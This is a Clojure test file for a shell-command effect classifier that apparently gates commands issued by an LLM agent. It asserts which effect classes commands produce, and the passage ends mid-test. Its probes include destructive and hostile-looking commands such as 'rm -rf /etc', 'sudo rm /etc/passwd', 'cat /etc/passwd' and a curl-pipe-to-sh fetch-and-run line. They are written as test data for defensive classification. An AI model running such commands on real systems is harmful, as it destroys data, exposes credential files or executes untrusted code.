(ns shell-shape-classify.classify-test
  "Tests for the v0.5.0 effect-classification pass — workflow-tree
  → effect-set. Verifies the program-classifier registry + composition
  rules in shell-shape-classify.classify against expected effect-instances."
  (:require
   [clojure.test :refer [deftest is testing]]
   [shell-shape-classify.classify :as cls]
   [shell-shape-classify.effects :as eff]
   [shell-shape.core :as ss]))

;; ---- Helpers ---------------------------------------------------------

(defn- effects-of
  ([cmd-str]      (effects-of cmd-str {}))
  ([cmd-str opts] (cls/classify-tree (merge {:registry eff/default-registry}
                                            opts)
                                     (ss/parse cmd-str))))

(defn- classes-of [cmd-str]
  (set (map :class (effects-of cmd-str))))

(defn- pairs-of [cmd-str]
  (cls/effect-set (effects-of cmd-str)))

(defn- has-pair? [cmd-str class scope]
  (contains? (pairs-of cmd-str) [class scope]))

(defn- has-class? [cmd-str class]
  (contains? (classes-of cmd-str) class))

;; ===========================================================================
;; CORE POSIX READ
;; ===========================================================================

(deftest ls-simple
  (is (has-pair? "ls /tmp" :fs-read "/tmp"))
  (is (= #{:fs-read} (classes-of "ls /tmp"))))

(deftest ls-no-args
  ;; Default scope "." when no path args.
  (is (has-pair? "ls" :fs-read ".")))

(deftest ls-multiple-paths
  (let [p (pairs-of "ls /a /b /c")]
    (is (contains? p [:fs-read "/a"]))
    (is (contains? p [:fs-read "/b"]))
    (is (contains? p [:fs-read "/c"]))))

(deftest ls-with-options-skipped
  ;; Options like -la skipped, only paths kept.
  (is (= #{[:fs-read "/tmp"]} (pairs-of "ls -la /tmp"))))

(deftest cat-fs-read
  (is (has-pair? "cat /etc/passwd" :fs-read "/etc/passwd")))

(deftest head-tail-grep-find-all-fs-read
  (is (has-class? "head /tmp/x"  :fs-read))
  (is (has-class? "tail /tmp/x"  :fs-read))
  (is (has-class? "grep foo /tmp/x" :fs-read))
  (is (has-class? "find . -name x" :fs-read)))

(deftest wc-stat-file-readlink
  (is (has-class? "wc /tmp/x"       :fs-read))
  (is (has-class? "stat /tmp/x"     :fs-read))
  (is (has-class? "file /tmp/x"     :fs-read))
  (is (has-class? "readlink /tmp/x" :fs-read)))

;; ===========================================================================
;; PURE / ENV-READ
;; ===========================================================================

(deftest echo-stdout-emit
  (is (= #{:stdout-emit} (classes-of "echo hello"))))

(deftest printf-stdout-emit
  (is (= #{:stdout-emit} (classes-of "printf hi"))))

(deftest pwd-env-read
  (is (= #{:env-read} (classes-of "pwd"))))

(deftest whoami-id-env-read
  (is (= #{:env-read} (classes-of "whoami")))
  (is (= #{:env-read} (classes-of "id"))))

(deftest date-uname-hostname-env-read
  (is (= #{:env-read} (classes-of "date")))
  (is (= #{:env-read} (classes-of "uname -a")))
  (is (= #{:env-read} (classes-of "hostname"))))

;; ===========================================================================
;; DESTRUCTIVE
;; ===========================================================================

(deftest rm-fs-delete
  (is (has-pair? "rm /tmp/x" :fs-delete "/tmp/x")))

(deftest rm-multiple-paths
  (let [p (pairs-of "rm /a /b")]
    (is (contains? p [:fs-delete "/a"]))
    (is (contains? p [:fs-delete "/b"]))))

(deftest rm-rf-still-fs-delete
  (is (= #{[:fs-delete "/etc"]} (pairs-of "rm -rf /etc"))))

(deftest unlink-rmdir-fs-delete
  (is (has-class? "unlink /tmp/x" :fs-delete))
  (is (has-class? "rmdir /tmp/x"  :fs-delete)))

(deftest mv-fs-read-and-write
  (let [p (pairs-of "mv /src /dst")]
    (is (contains? p [:fs-read "/src"]))
    (is (contains? p [:fs-write "/dst"]))))

(deftest cp-fs-read-and-write
  (let [p (pairs-of "cp /src /dst")]
    (is (contains? p [:fs-read "/src"]))
    (is (contains? p [:fs-write "/dst"]))))

(deftest mkdir-touch-chmod-chown
  (is (has-class? "mkdir /tmp/x"      :fs-write))
  (is (has-class? "touch /tmp/x"      :fs-write))
  (is (has-class? "chmod 755 /tmp/x"  :fs-write))
  (is (has-class? "chown me /tmp/x"   :fs-write)))

;; ===========================================================================
;; WRAPPERS — delegate to :invokes
;; ===========================================================================

(deftest sudo-emits-elevation-plus-wrapped
  (let [p (pairs-of "sudo rm /etc/passwd")]
    (is (contains? p [:privilege-elevate "root"]))
    (is (contains? p [:fs-delete "/etc/passwd"]))))

(deftest xargs-delegates-to-wrapped-family
  ;; xargs feeds stdin lines as args to the wrapped command. Statically
  ;; the inner rm has no positional path, but the EFFECT FAMILY (delete)
  ;; is known. v0.24.3 emits `[:fs-delete \"?\"]` — informative
  ;; classification with unknown scope, rather than `:opaque :no-target`
  ;; (which loses the family signal). Standard policy templates don't
  ;; grant `fs-delete:?` so this still defers by default; `fs-delete:**`
  ;; grants it.
  (is (has-pair? "xargs rm" :fs-delete "?"))
  (is (not (has-class? "xargs rm" :opaque))))

(deftest nice-delegates
  (is (has-class? "nice ls /tmp" :fs-read)))

(deftest nohup-delegates
  (is (has-class? "nohup rm /tmp/x" :fs-delete)))

(deftest find-with-exec
  ;; find walks fs (fs-read) and -exec invokes rm.
  ;; Composition mechanic: shell-shape's :find-exec strategy populates
  ;; :invokes on the find command with the parsed -exec body; classify
  ;; descends :invokes in classify-command regardless of find's leaf
  ;; classifier. This means find -exec composes the wrapped command's
  ;; effects correctly today — the substrate has been right since v0.5.0,
  ;; only the registry shape (find as :wraps? true) was misleading.
  (let [p       (pairs-of "find . -name foo -exec rm {} ;")
        classes (set (map first p))]
    (is (contains? classes :fs-read)
        "find walks the filesystem → :fs-read")
    (is (contains? classes :fs-delete)
        "wrapped rm via -exec → :fs-delete (substrate composes through :invokes)")))

;; ---------------------------------------------------------------------------
;; v0.8.0 P0 — find predicate/action discrimination
;;
;; Pre-v0.8.0, find used the generic classify-fs-read pattern. That generic
;; pattern reads every literal that doesn't start with `-` as a positional
;; path. Find's expression syntax breaks that assumption: `-type FOO`,
;; `-name PAT`, etc. take a non-path value, and `-delete` is a destructive
;; action that the generic classifier doesn't see.
;;
;; v0.8.0 ships a find-specific classifier that (a) stops positional
;; extraction at the first expression token (`-...`, `(`, `)`, `!`, `,`)
;; and (b) scans the expression for the `-delete` action and emits an
;; additional :fs-delete on the starting paths when present.

(deftest find-delete-emits-fs-delete
  ;; Pre-v0.8.0: only [:fs-read "/tmp"] — silent over-grant under any
  ;; :fs-read grant covering /tmp/**.
  (let [p (pairs-of "find /tmp -delete")]
    (is (contains? p [:fs-read "/tmp"])
        "find walks the filesystem first → :fs-read on starting path")
    (is (contains? p [:fs-delete "/tmp"])
        "find -delete is the destructive action → :fs-delete on starting path")))

(deftest find-delete-no-positional-defaults-to-cwd
  ;; `find -delete` with no positional path uses cwd. Match POSIX default.
  (let [p (pairs-of "find -delete")]
    (is (contains? p [:fs-read "."]))
    (is (contains? p [:fs-delete "."]))))

(deftest find-delete-multiple-paths
  (let [p (pairs-of "find /a /b -delete")]
    (is (contains? p [:fs-read "/a"]))
    (is (contains? p [:fs-read "/b"]))
    (is (contains? p [:fs-delete "/a"]))
    (is (contains? p [:fs-delete "/b"]))))

(deftest find-type-flag-value-not-treated-as-path
  ;; Pre-v0.8.0: emitted both [:fs-read "/tmp"] AND [:fs-read "f"] — the
  ;; "f" is the value of -type, not a path. v0.8.0 stops positional
  ;; extraction at -type.
  (let [p (pairs-of "find /tmp -type f")]
    (is (contains? p [:fs-read "/tmp"]))
    (is (not (contains? p [:fs-read "f"]))
        "-type's value `f` must not appear as a path")))

(deftest find-name-flag-value-not-treated-as-path
  (let [p (pairs-of "find /tmp -name foo")]
    (is (contains? p [:fs-read "/tmp"]))
    (is (not (contains? p [:fs-read "foo"]))
        "-name's pattern `foo` must not appear as a path")))

(deftest find-without-delete-only-fs-read
  ;; Plain find — no action, no fs-delete.
  (let [p (pairs-of "find /tmp -type f -print")]
    (is (contains? p [:fs-read "/tmp"]))
    (is (not (some (fn [[c _]] (= c :fs-delete)) p))
        "no -delete action → no :fs-delete")))

;; ---------------------------------------------------------------------------
;; v0.8.0 P0 — git / tar baseline :proc-spawn
;;
;; Pre-v0.8.0 both fell to :opaque "unclassified-program:<x>". The only
;; way to authorize them was right(:opaque, "**", _) — the loaded-gun
;; grant from thoughts.md line 23. Baseline :proc-spawn moves them off
;; opaque without yet discriminating their subcommands (deferred to P2's
;; argv-shape DSL).

(deftest git-baseline-proc-spawn
  (let [p (pairs-of "git status")]
    (is (contains? p [:proc-spawn "git"])
        "git lands on :proc-spawn baseline, not :opaque")
    (is (not (has-class? "git status" :opaque))
        "no :opaque effect from baseline git classifier")))

(deftest git-various-subcommands-baseline-proc-spawn
  (doseq [cmd ["git push origin main"
               "git pull"
               "git clone https://x.com/r.git"
               "git push --force origin main"
               "git --git-dir=/tmp/x status"]]
    (is (has-pair? cmd :proc-spawn "git")
        (str cmd " must emit :proc-spawn git baseline"))))

(deftest tar-baseline-proc-spawn
  (let [p (pairs-of "tar cvf /tmp/out.tar /src")]
    (is (contains? p [:proc-spawn "tar"]))
    (is (not (has-class? "tar cvf /tmp/out.tar /src" :opaque)))))

;; v0.10.0 P2 — git / tar argv-shape discrimination
;;
;; The argv-shape classifier emits the baseline :proc-spawn plus
;; per-subcommand extras. The shape name is stored on each effect-
;; record's :provenance.argv-shape (lifted to top-level :argv-shape
;; by P1's enrich-effects in normalize.clj).

(deftest git-push-emits-net-out
  (let [eff (effects-of "git push origin main")]
    (is (some #(and (= :proc-spawn (:class %)) (= "git" (:scope %))) eff))
    (is (some #(and (= :net-out (:class %)) (= "git-push" (:scope %))) eff))))

(deftest git-push-force-shape-discriminated
  (testing "push --force is the destructive variant; shape name baked in
            provenance for the coordinate-axis policy."
    (let [eff (effects-of "git push --force origin main")
          shapes (set (map #(get-in % [:provenance :argv-shape]) eff))]
      (is (contains? shapes "git-push-destructive"))
      (is (some #(and (= :net-out (:class %)) (= "git-push" (:scope %))) eff)))))

(deftest git-push-force-is-position-invariant
  (testing "shape match doesn't care about flag position among flags."
    (doseq [cmd ["git push --force origin main"
                 "git push origin --force main"
                 "git push origin main --force"
                 "git -c receive.x=y push --force origin"]]
      (let [eff (effects-of cmd)
            shapes (set (map #(get-in % [:provenance :argv-shape]) eff))]
        (is (contains? shapes "git-push-destructive")
            (str cmd " must match git-push-destructive"))))))

(deftest git-status-shape-coordinate-only
  (testing "git status emits :proc-spawn + shape coordinate; no extra
            effects (status is read-only)."
    (let [eff (effects-of "git status")
          shapes (set (map #(get-in % [:provenance :argv-shape]) eff))]
      (is (contains? shapes "git-status"))
      (is (not (some #(= :net-out (:class %)) eff))))))

(deftest git-clone-emits-net-out
  (let [eff (effects-of "git clone https://x.com/r.git")]
    (is (some #(and (= :net-out (:class %)) (= "git-clone" (:scope %))) eff))))

(deftest git-pull-and-fetch-emit-net-out
  (doseq [[cmd scope] [["git pull"  "git-pull"]
                       ["git fetch" "git-fetch"]]]
    (let [eff (effects-of cmd)]
      (is (some #(and (= :net-out (:class %)) (= scope (:scope %))) eff)
          (str cmd " must emit :net-out " scope)))))

(deftest tar-create-shape-bakes-coordinate
  (let [eff (effects-of "tar cvf /tmp/out.tar /src")
        shapes (set (map #(get-in % [:provenance :argv-shape]) eff))]
    (is (contains? shapes "tar-create"))))

(deftest tar-extract-shape-bakes-coordinate
  (let [eff (effects-of "tar -xf /tmp/out.tar")
        shapes (set (map #(get-in % [:provenance :argv-shape]) eff))]
    (is (contains? shapes "tar-extract"))))

(deftest tar-list-shape-bakes-coordinate
  (let [eff (effects-of "tar -tf /tmp/out.tar")
        shapes (set (map #(get-in % [:provenance :argv-shape]) eff))]
    (is (contains? shapes "tar-list"))))

;; ===========================================================================
;; INTERPRETERS
;; ===========================================================================

(deftest bash-direct-shell-interpret
  (is (has-pair? "bash -c 'rm /tmp/x'" :shell-interpret "bash"))
  ;; The -c body recurses and emits fs-delete.
  (is (has-class? "bash -c 'rm /tmp/x'" :fs-delete)))

(deftest sh-direct-posix-interpret
  (is (has-pair? "sh -c 'ls /tmp'" :shell-interpret "posix"))
  (is (has-class? "sh -c 'ls /tmp'" :fs-read)))

(deftest python3-direct-interp-interpret
  (is (has-class? "python3 -c 'import os'" :interp-interpret))
  ;; Body is stub → opaque.
  (is (has-class? "python3 -c 'import os'" :opaque)))

(deftest node-direct-interp-interpret
  (is (has-class? "node -e 'process.exit(0)'" :interp-interpret)))

(deftest zsh-direct-shell-interpret
  (is (has-pair? "zsh -c 'ls /tmp'" :shell-interpret "zsh")))

(deftest ruby-direct-interp-interpret
  (is (has-class? "ruby -e 'puts 1'" :interp-interpret)))

(deftest fish-direct-interp-interpret
  ;; fish — not POSIX; classified as :interp-interpret, body is a
  ;; stub dialect so the inner script surfaces as :opaque.
  (is (has-class? "fish -c 'ls'" :interp-interpret)))

;; ===========================================================================
;; NETWORK
;; ===========================================================================

(deftest curl-net-out
  (is (has-pair? "curl https://api.example.com/x" :net-out "api.example.com")))

(deftest wget-net-out-and-fs-write
  (let [p (pairs-of "wget https://x.com/file.txt")]
    (is (contains? (set (map first p)) :net-out))
    (is (contains? p [:fs-write "."]))))

(deftest ssh-net-out-plus-remote-cmd-classify
  ;; v0.7.0: ssh's literal remote command is recursively classified
  ;; with scope prefixed `ssh:<host>:`. Local fs-read grants do NOT
  ;; authorize the prefixed remote scope.
  (let [p (pairs-of "ssh user@host.com ls /tmp")]
    (is (contains? p [:net-out "host.com"])
        "user@ prefix stripped; host becomes the net-out scope")
    (is (contains? p [:fs-read "ssh:host.com:/tmp"])
        "remote `ls /tmp` recursively classified with ssh: prefix")))

(deftest ssh-interactive-no-remote-cmd
  ;; `ssh host` with no remote command stays as net-out only — no
  ;; phantom :opaque emission.
  (let [p (pairs-of "ssh host.com")]
    (is (contains? p [:net-out "host.com"]))
    (is (not (contains? (set (map first p)) :opaque))
        "interactive ssh emits no :opaque")))

(deftest rsync-net-out-when-remote
  ;; rsync to a remote host:path triggers net-out.
  (is (has-class? "rsync -av /tmp/x user@host.com:/dst" :net-out)))

(deftest scp-net-out
  (is (has-class? "scp /tmp/x user@host.com:/dst" :net-out)))

;; ===========================================================================
;; ADDITIONAL READ/WRITE/SCOPE PINS (mutation-pinned)
;; ===========================================================================

(deftest touch-scope-is-narrow
  (is (has-pair? "touch /tmp/f" :fs-write "/tmp/f")))

(deftest trap-builtin-emits-something-narrow
  ;; trap is a shell builtin — should be classified by builtin
  ;; classifier; mutation :swap-scope-glob would widen any scope.
  ;; If trap emits no widenable scope, the mutation is a static
  ;; no-op; if it does, the scope must be pinned.
  (let [classes (classes-of "trap 'echo' INT")]
    ;; trap as a builtin should at least emit something or be safe
    (is (or (empty? classes)
            (contains? classes :opaque)
            (contains? classes :stdout-emit))
        "trap classification is observable")))

(deftest ionice-as-wrapper-propagates
  ;; ionice wraps; rm under ionice still emits fs-delete.
  (is (has-class? "ionice -c2 rm /tmp/x" :fs-delete))
  ;; ionice itself shouldn't widen the rm scope.
  (is (has-pair? "ionice -c2 rm /tmp/x" :fs-delete "/tmp/x")
      "wrapped rm scope must remain narrow — not /tmp/x**"))

;; ===========================================================================
;; REGISTRY ENTRY PIN TABLE (mutation-pinned bulk)
;; ===========================================================================
;;
;; One row per entry the mutation harness needs to pin. Each row carries:
;;   :probe         the synthetic command-line to classify
;;   :must-pairs    [class scope] pairs that must appear in the result
;;                  (kills :drop-entry, :relax-classifier, :swap-class,
;;                   :swap-scope-glob)
;;   :must-not-have classes that must NOT appear (kills :swap-class one-way)
;;
;; Add a row whenever the mutation harness surfaces a new survivor. The
;; rows are data — adding one is a single literal, not a new deftest.

(def ^:private entry-pins
  [{:probe "stdbuf -i0 rm /tmp/x"
    :must-pairs   #{[:fs-delete "/tmp/x"]}}
   {:probe "time ls /tmp"
    :must-pairs   #{[:fs-read "/tmp"]}}
   {:probe "readlink /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "file /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "diff /tmp/a /tmp/b"
    :must-pairs   #{[:fs-read "/tmp/a"] [:fs-read "/tmp/b"]}
    :must-not-have #{:fs-write}}
   {:probe "grep foo /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "source /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "uniq /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "od /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "rsync /tmp/a /tmp/b"
    :must-pairs   #{[:fs-read "/tmp/a"] [:fs-write "/tmp/b"]}}
   {:probe "rsync /tmp/a user@h.com:/dst"
    :must-pairs   #{[:fs-read "/tmp/a"]}
    :must-classes #{:net-out}}
   {:probe "cut -d, -f1 /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   ;; which / basename / dirname — v0.24.3: moved out of Group (a).
   ;; which scans $PATH (env-read), it does not fs-read the command-name
   ;; literal. basename / dirname are pure string ops — no fs touch.
   {:probe "which ls"
    :must-classes #{:env-read}
    :must-not-have #{:fs-read}}
   {:probe "basename /tmp/x"
    :must-classes #{:stdout-emit}
    :must-not-have #{:fs-read}}
   {:probe "dirname /tmp/x"
    :must-classes #{:stdout-emit}
    :must-not-have #{:fs-read}}
   {:probe "ln /tmp/a /tmp/b"
    :must-pairs   #{[:fs-write "/tmp/a"] [:fs-write "/tmp/b"]}}
   {:probe "unlink /tmp/x"
    :must-pairs   #{[:fs-delete "/tmp/x"]}}
   {:probe "type ls"
    :must-classes #{:env-read}}
   {:probe "wc /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "hexdump /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "fold /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "awk -f /tmp/p.awk /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/p.awk"] [:fs-read "/tmp/x"]}}
   {:probe "sed s/a/b/ /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "rmdir /tmp/d"
    :must-pairs   #{[:fs-delete "/tmp/d"]}}
   {:probe "ssh u@h.com"
    ;; v0.7.0: ssh-host-from-args strips the user@ prefix; the host is
    ;; the scope. Authorizing host h.com authorizes whichever user the
    ;; LLM chose to ssh as (still gated by network policy).
    :must-pairs   #{[:net-out "h.com"]}}
   {:probe "netcat example.com 80"
    :must-pairs   #{[:net-out "example.com"]}}
   {:probe "python /tmp/x"
    :must-pairs   #{[:interp-interpret "python"]}}
   {:probe "fish /tmp/x.fish"
    :must-pairs   #{[:interp-interpret "fish"]}}
   {:probe "perl /tmp/x.pl"
    :must-pairs   #{[:interp-interpret "perl"]}}
   {:probe "tr a b /tmp/x"
    :must-pairs   #{[:fs-read "/tmp/x"]}}
   {:probe "paste /tmp/a /tmp/b"
    :must-pairs   #{[:fs-read "/tmp/a"] [:fs-read "/tmp/b"]}}
   {:probe "trap \"rm /tmp/x\" INT"
    ;; v0.7.0: trap recursively classifies the literal body and
    ;; prefixes each scope with `trap:` so registered effects can be
    ;; authored separately from immediate-execution effects.
    :must-pairs   #{[:fs-delete "trap:/tmp/x"]}}

   ;; v0.8.0 P0 — find -delete + flag-with-value handling. Both rows
   ;; pin classifier shape that the mutation harness would otherwise
   ;; flip back to the pre-v0.8.0 generic classify-fs-read pattern.
   {:probe "find /tmp -delete"
    :must-pairs   #{[:fs-read "/tmp"] [:fs-delete "/tmp"]}}
   {:probe "find /tmp -type f"
    :must-pairs    #{[:fs-read "/tmp"]}
    :must-not-have #{:opaque}}
   {:probe "find /tmp -name foo"
    :must-pairs    #{[:fs-read "/tmp"]}
    :must-not-have #{:opaque}}

   ;; v0.8.0 P0 — git / tar baseline :proc-spawn. Pre-v0.8.0 both fell
   ;; to :opaque "unclassified-program:..." which forced the loaded-gun
   ;; right(:opaque, "**", _) grant. Baseline :proc-spawn lets policy
   ;; authors grant git/tar without authorizing every opaque effect.
   {:probe "git status"
    :must-pairs    #{[:proc-spawn "git"]}
    :must-not-have #{:opaque}}
   {:probe "tar cvf out.tar /src"
    :must-pairs    #{[:proc-spawn "tar"]}
    :must-not-have #{:opaque}}

   ;; v0.8.0 P0 — pre-existing entry-pin gaps surfaced by the seed-1
   ;; selection shift after adding git/tar to the registry. The mutators
   ;; (:swap-scope-glob, :drop-entry, :relax-classifier) flipped these
   ;; entries silently before v0.8.0 because seed 1's iteration sequence
   ;; happened to skip them. Pinning each — scope, class, and (for
   ;; wrappers) :must-not-have :opaque — closes the gap permanently.
   {:probe "sort /tmp/x"     :must-pairs #{[:fs-read "/tmp/x"]}}
   {:probe "head /tmp/x"     :must-pairs #{[:fs-read "/tmp/x"]}}
   {:probe "tail /tmp/x"     :must-pairs #{[:fs-read "/tmp/x"]}}
   {:probe "realpath /tmp/x" :must-pairs #{[:fs-read "/tmp/x"]}}
   {:probe "typeset VAR=val"
    :must-pairs    #{[:env-mutate "VAR"]}
    :must-not-have #{:opaque}}
   {:probe "! rm /tmp/x"
    :must-pairs    #{[:fs-delete "/tmp/x"]}
    :must-not-have #{:opaque}}
   {:probe "coproc rm /tmp/x"
    :must-pairs    #{[:fs-delete "/tmp/x"]}
    :must-not-have #{:opaque}}
   {:probe "stdbuf -i0 rm /tmp/y"
    ;; The pin at line ~271 (`stdbuf -i0 rm /tmp/x`) survives :drop-entry
    ;; because rm's :fs-delete still fires via :invokes descent. Adding
    ;; :must-not-have :opaque catches the drop (which would surface
    ;; :opaque "unclassified-program:stdbuf" alongside).
    :must-pairs    #{[:fs-delete "/tmp/y"]}
    :must-not-have #{:opaque}}
   {:probe "mailx user@example.com"
    :must-pairs    #{[:net-out "user@example.com"]}
    :must-not-have #{:opaque}}
   {:probe "sendmail user@example.com"
    :must-pairs    #{[:net-out "user@example.com"]}
    :must-not-have #{:opaque}}

   ;; Benign-emit entries — env-read or stdout-emit only. Pinning the
   ;; emitted class kills :drop-entry (would replace with :opaque) and
   ;; :relax-classifier (would replace with []).
   {:probe "true"     :must-classes #{:env-read}}
   {:probe "false"    :must-classes #{:env-read}}
   {:probe "test 1"   :must-classes #{:env-read}}
   {:probe "[ -n a ]" :must-classes #{:env-read}}
   {:probe "jobs"     :must-classes #{:env-read}}
   {:probe "top"      :must-classes #{:env-read}}
   {:probe "wait"     :must-classes #{:stdout-emit}}])

(deftest registry-entry-pins
  (doseq [{:keys [probe must-pairs must-classes must-not-have]} entry-pins]
    (let [pairs   (pairs-of probe)
          classes (classes-of probe)]
      (doseq [p must-pairs]
        (is (contains? pairs p)
            (str probe " must include effect pair " (pr-str p)
                 " — got " (pr-str pairs))))
      (doseq [c must-classes]
        (is (contains? classes c)
            (str probe " must include effect class " c
                 " — got " (pr-str classes))))
      (doseq [c must-not-have]
        (is (not (contains? classes c))
            (str probe " must NOT include effect class " c
                 " — got " (pr-str classes)))))))

(deftest diff-emits-fs-read-not-fs-write
  (is (has-class? "diff /tmp/a /tmp/b" :fs-read))
  (is (not (has-class? "diff /tmp/a /tmp/b" :fs-write))))

(deftest realpath-emits-fs-read-not-fs-write
  (is (has-class? "realpath /tmp/x" :fs-read))
  (is (not (has-class? "realpath /tmp/x" :fs-write))))

(deftest xxd-emits-fs-read-not-fs-write
  (is (has-pair? "xxd /tmp/x" :fs-read "/tmp/x")
      "xxd scope must be exact — not /tmp/x**")
  (is (not (has-class? "xxd /tmp/x" :fs-write))))

(deftest sed-emits-fs-read
  (is (has-class? "sed s/a/b/ /tmp/x" :fs-read)))

(deftest nohup-also-propagates-wrapped-effects
  (is (has-class? "nohup rm /tmp/x" :fs-delete)))

(deftest scp-net-out-plus-fs
  (let [p (pairs-of "scp /tmp/x user@host:/dst")]
    (is (contains? (set (map first p)) :net-out))))

(deftest nc-listening-mode
  (is (has-class? "nc -l 8080" :net-in)))

(deftest nc-outbound
  (is (has-class? "nc example.com 80" :net-out)))

;; ===========================================================================
;; PROCESS
;; ===========================================================================

(deftest kill-proc-signal
  (is (has-class? "kill 1234" :proc-signal)))

(deftest ps-env-read
  (is (= #{:env-read} (classes-of "ps aux"))))

;; ===========================================================================
;; UNCLASSIFIED PROGRAM
;; ===========================================================================

(deftest unknown-program-opaque
  (let [p (pairs-of "totallyunknownprogram --x")]
    (is (some #(= :opaque (first %)) p))))

(deftest empty-input-no-effects
  (is (empty? (effects-of ""))))

;; ===========================================================================
;; PIPELINES (composition: union of stage effects)
;; ===========================================================================

(deftest pipeline-union
  (let [p (pairs-of "ls /tmp | grep foo")]
    (is (contains? (set (map first p)) :fs-read))))

(deftest pipeline-ls-rm
  ;; ls /tmp | xargs rm — ls is fs-read; the rm via xargs has paths
  ;; from stdin (statically unknown scope). v0.24.3: emits
  ;; [:fs-delete \"?\"] instead of :opaque, preserving the delete-family
  ;; signal for policy granularity.
  (let [p (pairs-of "ls /tmp | xargs rm")]
    (is (contains? (set (map first p)) :fs-read))
    (is (contains? p [:fs-delete "?"]))))

;; ===========================================================================
;; CHAIN (;, &&, ||) — conservative union
;; ===========================================================================

(deftest chain-and-union
  (let [p (pairs-of "ls /tmp && rm /etc/x")]
    (is (contains? (set (map first p)) :fs-read))
    (is (contains? (set (map first p)) :fs-delete))))

(deftest chain-or-union
  (let [p (pairs-of "ls /tmp || rm /etc/x")]
    (is (contains? (set (map first p)) :fs-read))
    (is (contains? (set (map first p)) :fs-delete))))

(deftest chain-seq-union
  (let [p (pairs-of "ls /tmp ; rm /etc/x")]
    (is (contains? (set (map first p)) :fs-read))
    (is (contains? (set (map first p)) :fs-delete))))

;; ===========================================================================
;; REDIRECTS
;; ===========================================================================

(deftest redirect-out-emits-fs-write
  (let [p (pairs-of "echo hi > /tmp/x")]
    (is (contains? p [:fs-write "/tmp/x"]))))

(deftest redirect-append-emits-fs-write
  (let [p (pairs-of "echo hi >> /tmp/x")]
    (is (contains? p [:fs-write "/tmp/x"]))))

(deftest redirect-in-emits-fs-read
  (let [p (pairs-of "cat < /tmp/x")]
    (is (contains? p [:fs-read "/tmp/x"]))))

;; ===========================================================================
;; HEREDOCS / HERE-STRINGS / PROGRAM-SOURCES
;; ===========================================================================

(deftest heredoc-bash-direct
  ;; bash <<EOF; rm /tmp; EOF — body parsed under :bash, rm surfaces.
  (let [p (pairs-of "bash <<EOF\nrm /tmp/x\nEOF\n")]
    (is (contains? (set (map first p)) :shell-interpret))
    (is (contains? p [:fs-delete "/tmp/x"]))))

(deftest heredoc-cat-piped-to-sh
  ;; cat <<EOF | sh — body is posix source, rm surfaces.
  (let [p (pairs-of "cat <<EOF | sh\nrm /tmp/x\nEOF\n")]
    (is (contains? p [:fs-delete "/tmp/x"]))))

(deftest here-string-bash
  ;; bash <<<"rm /tmp/x" — here-string body parses as :bash.
  (let [p (pairs-of "bash <<<\"rm /tmp/x\"")]
    (is (contains? p [:fs-delete "/tmp/x"]))))

(deftest arg-string-echo-piped-to-sh
  ;; echo "rm /tmp/x" | sh — args become posix source.
  (let [p (pairs-of "echo \"rm /tmp/x\" | sh")]
    (is (contains? p [:fs-delete "/tmp/x"]))))

(deftest broken-chain-fail-closed
  ;; cat <<EOF | grep foo | sh — body filtered, sh stdin opaque.
  (is (has-class? "cat <<EOF | grep foo | sh\nrm /tmp\nEOF\n" :opaque)))

(deftest curl-pipe-to-sh-opaque
  ;; curl https://x.com | sh — body unknown.
  (is (has-class? "curl https://x.com | sh" :opaque)))

(deftest python-heredoc-opaque
  ;; python3 <<EOF; import os; EOF — body-dialect :python stub → opaque.
  (is (has-class? "python3 <<EOF\nimport os\nEOF\n" :opaque)))

;; ===========================================================================
;; SUBSHELLS IN ARGS
;; ===========================================================================

(deftest subshell-in-arg-emits-inner-effects
  ;; echo $(rm /tmp/x) — rm runs regardless of echo's tolerance.
  (let [p (pairs-of "echo $(rm /tmp/x)")]
    (is (contains? p [:fs-delete "/tmp/x"]))
    (is (contains? (set (map first p)) :stdout-emit))))

(deftest backtick-in-arg-emits-inner-effects
  (let [p (pairs-of "echo `rm /tmp/x`")]
    (is (contains? p [:fs-delete "/tmp/x"]))))

;; ===========================================================================
;; EVAL / DYNAMIC
;; ===========================================================================

(deftest eval-variable-opaque
  ;; eval $CMD — :invokes has :unresolved :reason :variable-args
  (is (has-class? "eval $CMD" :opaque)))

;; ===========================================================================
;; SUDO NESTED IN XARGS (composition + composition)
;; ===========================================================================

(deftest sudo-nested-in-xargs
  ;; xargs sudo rm — wrapper of wrapper. xargs delegates to sudo;
  ;; sudo emits privilege-elevate + delegates to rm. v0.24.3:
  ;; :stdin-fed-positionals? propagates through sudo's invokes descent,
  ;; so the inner rm's empty-paths surface as [:fs-delete \"?\"] rather
  ;; than the v0.5.0 :opaque :no-target.
  (let [p (pairs-of "xargs sudo rm")]
    (is (contains? p [:privilege-elevate "root"]))
    (is (contains? p [:fs-delete "?"]))))

;; ===========================================================================
;; STDIN / OPTION-TERMINATOR (T15 — paths-from-args malformed flags)
;; ===========================================================================

(deftest cat-dash-emits-stdin-consume
  ;; `cat -` reads stdin. Must not collapse to fs-read on "." (the
  ;; v0.5.0 behavior treated "-" as a flag and fell through to the
  ;; no-path default).
  (let [classes (classes-of "cat -")]
    (is (contains? classes :stdin-consume)
        "literal `-` as a positional arg signals stdin consumption")
    (is (not (has-pair? "cat -" :fs-read "."))
        "literal `-` must NOT collapse to fs-read on \".\"")))

(deftest cat-double-dash-flagged-file-is-fs-read
  ;; `cat -- -weird.txt`: `--` terminates option parsing; `-weird.txt`
  ;; is a positional literal (a file name that happens to start with -).
  (is (has-pair? "cat -- -weird.txt" :fs-read "-weird.txt")
      "after `--`, args starting with `-` are positional"))

(deftest cat-mixed-flags-paths-stdin
  ;; `cat -la /tmp/x -` → /tmp/x is a path, - is stdin.
  (let [p       (pairs-of "cat -la /tmp/x -")
        classes (classes-of "cat -la /tmp/x -")]
    (is (contains? p [:fs-read "/tmp/x"]))
    (is (contains? classes :stdin-consume))
